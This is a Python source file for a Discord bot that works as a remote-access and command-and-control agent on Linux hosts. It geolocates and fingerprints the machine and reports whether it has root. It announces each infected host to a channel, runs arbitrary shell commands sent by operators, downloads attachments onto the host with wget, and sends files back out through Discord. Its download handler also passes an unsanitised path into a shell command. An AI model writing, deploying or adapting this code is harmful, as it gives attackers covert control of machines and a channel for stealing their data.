#!/usr/bin/env python3

"""DOCSTRING: This script provides an interface accessible by users via the
Discord client for the purpose of passing remote commands to a host."""

__author__      = "Sid Lacy, Nathan Burns"
__copyright__   = "MIT"

################################################################################

apitoken = "INSERT_API_TOKEN_HERE"
debug = "INSERT_CHANNEL_ID_HERE"
allowed_users = ['INSERT_USER_IDs_HERE']

################################################################################

# Imports
import discord # Used to interact with the Discord API
import json # used to parse output f
from discord.ext import commands # Used to create commands and use Discord events
import os # Used to execute commands on remote host(s)
import sys # # Used to get the file name (ID) of the running process
from discord.colour import Color # Used to change embed colors

# Initialize bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix='?', intents=intents)

# Store system attributes
client_ipinfo_dict = json.loads(os.popen('curl -s ipinfo.io').read().strip())
client_ip = client_ipinfo_dict['ip']
client_location = client_ipinfo_dict['loc']
client_city = client_ipinfo_dict['city']
client_region = client_ipinfo_dict['region']
client_country = client_ipinfo_dict['country']
client_isp = client_ipinfo_dict['org']
client_timezone = client_ipinfo_dict['timezone']
client_id = os.path.basename(sys.argv[0])
client_hostname = os.popen('hostname').read().strip()
client_user = f"{os.popen('whoami').read().strip()}@{os.popen('hostname').read().strip()}"
client_euid = os.geteuid()
client_os = os.popen('cat /etc/os-release | grep PRETTY_NAME').read().strip().split("=",1)[1][1:-1]

# Set embed color depending on bot access rights
listcolor = Color.green()
if client_euid == 0:
    listcolor = Color.gold()

# Notify channel on execution
@bot.event
async def on_ready():
    channel = bot.get_channel(int(debug))
    await channel.send(f'[!] {client_id} ({client_os}) has joined from {client_ip}.')

# Prevents users not included within allowed_users from executing privileged commnands
async def auth(ctx):
    if str(ctx.message.author.id) not in allowed_users and client_id in ctx.message.content:
        await ctx.send(f"{ctx.message.author.mention} is not allowed to access this command on {client_id}! Please contact an administrator if this is a mistake.")
        return 1
    # Disallow bot commands inside DMs
    elif isinstance(ctx.channel, discord.channel.DMChannel):
        return
    else:
        return 0

# Queue active hosts; get latency
# ?ping`
@bot.command(pass_context=True)
async def ping(ctx):
    await ctx.send(f"[!] {client_id}: 'Pong' in {round(bot.latency * 1000)} ms.")

# Fetches system information from clients
# ?hosts`
@bot.command(pass_context=True)
async def hosts(ctx):
    if isinstance(ctx.channel, discord.channel.DMChannel):
        return
    else:
        embed = discord.Embed(title=f"Client ID: {client_id}", color=listcolor)
        embed.add_field(name="IP Address", value=f'[{client_ip}](https://whois.domaintools.com/{client_ip})')
        embed.add_field(name="Alpha", value=client_country)
        embed.add_field(name="Estimated Location", value=f'[{client_location}](https://maps.google.com/?q={client_location})')
        embed.add_field(name="Operating System", value=client_os)
        embed.add_field(name="EUID", value=client_euid)
        embed.add_field(name="User on Host", value=client_user)
        embed.add_field(name="Service Provider",value=client_isp)
        await ctx.send(embed=embed)

# Executes $cmd on system
# `?cmd  $command`
@bot.command(pass_context=True)
async def cmd(ctx): 
    # Only allow commands from authorized users
    if await auth(ctx):
        return
    elif client_id in ctx.message.content:
        # Strips chars preceeding command from command string
        command = str(ctx.message.content)[(len(client_id) + 6):]
        ret = f"[!] Executing on {client_id} ({client_ip})!\n```shell\n{client_user}$ {command}\n\n{os.popen(command).read()}```"
        await ctx.send(ret)
    else:
        return

# Uploads an attachment to a host
# `?upload $client_id $attachment`
@bot.command(pass_context=True)
async def upload(ctx):
    # Only allow commands from authorized users
    if await auth(ctx):
        return
    elif ctx.message.attachments:
        url = str(ctx.message.attachments[0])
        os.popen(f"wget -q {url}").read()
        await ctx.send('[!] Upload successful.')
    else:
        await ctx.send('[!] No attachment provided.')

# Downloads a file from a host
# `?download $client_id $file_path`
@bot.command(pass_context=True)
async def download(ctx):
    # Only allow commands from authorized users
    if await auth(ctx):
        return
    else:
        file_path = str(ctx.message.content)[(len(client_id) + 11):]
        file_size = int((os.popen(f"du {file_path}" + " | awk '{print $1}'")).read())
        if file_size > 3900:
            await ctx.send(f'[!] The requested file ({file_size} bytes) exceeds the Discord API upload capacity (3900) bytes.')
        else:
            await ctx.send(file=discord.File(rf'{file_path}'))

# Kills the parent process, deauthing the client
# `?kill $client_id`
@bot.command(pass_context=True)
async def kill(ctx):
    # Only allow commands from authorized users
    if await auth(ctx):
        return
    else:
        await ctx.send(f'[!] {client_id} killed.')
        os.popen('kill -9 $(ps -o ppid= | head -n 1)').read()

# Connect to Discord
bot.run(apitoken)